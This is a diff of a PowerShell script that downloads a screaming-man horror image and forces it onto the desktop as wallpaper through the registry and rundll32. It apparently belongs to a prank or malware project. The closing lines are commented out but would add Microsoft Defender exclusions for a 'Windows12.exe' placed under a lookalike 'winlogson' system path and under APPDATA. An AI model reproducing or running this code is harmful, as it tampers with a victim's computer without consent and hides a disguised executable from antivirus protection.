@@ -1,19 +1,31 @@
-# start $ENV:windir/System32/cmd.exe
+# Start cmd.exe
+# Start-Process "$env:windir\System32\cmd.exe"
+
 $imageUrl = "https://thumbs.dreamstime.com/b/man-screams-fear-horror-pop-art-retro-vector-illustration-103789731.jpg"
 $outputPath = "$env:USERPROFILE\sfondo.jpg"
-Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath
 
-while (!(Test-Path $outputPath)) {
+# Create a job to download the file
+$job = Start-Job -ScriptBlock {
+    param($url, $path)
+    Invoke-WebRequest -Uri $url -OutFile $path
+} -ArgumentList $imageUrl, $outputPath
+
+# Wait for the job to complete
+Wait-Job -Job $job | Out-Null
+
+# Check if the file exists and has content
+while (!(Test-Path $outputPath -PathType Leaf) -or (Get-Item $outputPath).Length -eq 0) {
     Start-Sleep -Seconds 1
 }
-while (!(Test-Path $outputPath -PathType Leaf) -or (Get-Item $outputPath).length -eq 0) {
-    Start-Sleep -Seconds 1
-}
 
+# Set the wallpaper
 $RegKeyPath = "HKCU:\Control Panel\Desktop"
 Set-ItemProperty -Path $RegKeyPath -Name Wallpaper -Value $outputPath
 rundll32.exe user32.dll, UpdatePerUserSystemParameters
 RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters 1, True
+
+# Clean up the job
+Remove-Job -Job $job
 
 # Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
 # Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
